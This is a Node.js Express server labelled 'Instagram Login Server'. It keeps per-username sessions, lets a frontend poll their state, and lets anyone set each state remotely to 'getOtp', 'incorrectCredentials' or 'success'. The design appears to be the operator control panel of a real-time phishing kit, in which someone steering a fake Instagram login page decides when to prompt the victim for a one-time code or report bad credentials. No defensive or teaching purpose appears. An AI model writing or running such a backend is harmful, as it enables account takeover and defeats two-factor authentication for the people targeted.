const express = require('express');
const cors = require('cors');

const app = express();

// Enhanced CORS configuration
app.use(cors({
  origin: '*', // Allow all origins for now
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true
}));

app.use(express.json());

// In-memory store for session states
// Format: { sessionId: { state: 'waiting'|'getOtp'|'incorrectCredentials'|'success', username: string } }
const sessionStore = {};

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running' });
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({ 
    status: 'ok', 
    message: 'Instagram Login Server',
    endpoints: {
      health: '/health',
      createSession: 'POST /api/create-session',
      getState: 'GET /api/get-state/:sessionId',
      setState: 'POST /api/set-state'
    },
    usage: {
      step1: 'POST /api/create-session with { username } to create a session',
      step2: 'GET /api/get-state/:sessionId to check current state (frontend polls this)',
      step3: 'POST /api/set-state with { sessionId, command } to set state from anywhere',
      commands: ['getOtp', 'incorrectCredentials', 'success']
    }
  });
});

// Create a new session
app.post('/api/create-session', (req, res) => {
  const { username } = req.body;
  
  if (!username) {
    return res.status(400).json({ 
      success: false, 
      error: 'Username is required' 
    });
  }
  
  // Generate a unique session ID
  const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  
  // Store session with initial state
  sessionStore[sessionId] = {
    state: 'waiting',
    username: username,
    createdAt: new Date().toISOString()
  };
  
  console.log(`Session created: ${sessionId} for username: ${username}`);
  
  res.json({ 
    success: true, 
    sessionId: sessionId,
    message: 'Session created successfully' 
  });
});

// Get current state for a session (frontend polls this)
app.get('/api/get-state/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  
  if (!sessionStore[sessionId]) {
    return res.status(404).json({ 
      success: false, 
      error: 'Session not found' 
    });
  }
  
  const session = sessionStore[sessionId];
  
  res.json({ 
    success: true, 
    state: session.state,
    username: session.username,
    message: `Current state: ${session.state}` 
  });
});

// Set state for a session (call this from anywhere)
app.post('/api/set-state', (req, res) => {
  const { sessionId, command } = req.body;
  
  if (!sessionId) {
    return res.status(400).json({ 
      success: false, 
      error: 'sessionId is required' 
    });
  }
  
  if (!command) {
    return res.status(400).json({ 
      success: false, 
      error: 'Command is required. Use: getOtp, incorrectCredentials, or success' 
    });
  }
  
  if (!sessionStore[sessionId]) {
    return res.status(404).json({ 
      success: false, 
      error: 'Session not found' 
    });
  }
  
  const validCommands = ['getOtp', 'incorrectCredentials', 'success'];
  
  if (!validCommands.includes(command)) {
    return res.status(400).json({ 
      success: false, 
      error: `Invalid command. Use one of: ${validCommands.join(', ')}` 
    });
  }
  
  // Update session state
  sessionStore[sessionId].state = command;
  sessionStore[sessionId].updatedAt = new Date().toISOString();
  
  console.log(`Session ${sessionId} state updated to: ${command}`);
  
  res.json({ 
    success: true, 
    state: command,
    message: `State updated to: ${command}` 
  });
});

// Optional: Clean up old sessions (older than 1 hour)
setInterval(() => {
  const oneHourAgo = Date.now() - 60 * 60 * 1000;
  Object.keys(sessionStore).forEach(sessionId => {
    const createdAt = new Date(sessionStore[sessionId].createdAt).getTime();
    if (createdAt < oneHourAgo) {
      delete sessionStore[sessionId];
      console.log(`Cleaned up old session: ${sessionId}`);
    }
  });
}, 60 * 60 * 1000); // Run every hour

const PORT = process.env.PORT || 3001;
const HOST = process.env.HOST || '0.0.0.0';
app.listen(PORT, HOST, () => {
  console.log(`Server running on ${HOST}:${PORT}`);
  console.log('API Endpoints:');
  console.log('  POST /api/create-session - Create a new session');
  console.log('  GET  /api/get-state/:sessionId - Get current state (poll this)');
  console.log('  POST /api/set-state - Set state from anywhere');
  console.log('Available commands: getOtp, incorrectCredentials, success');
});
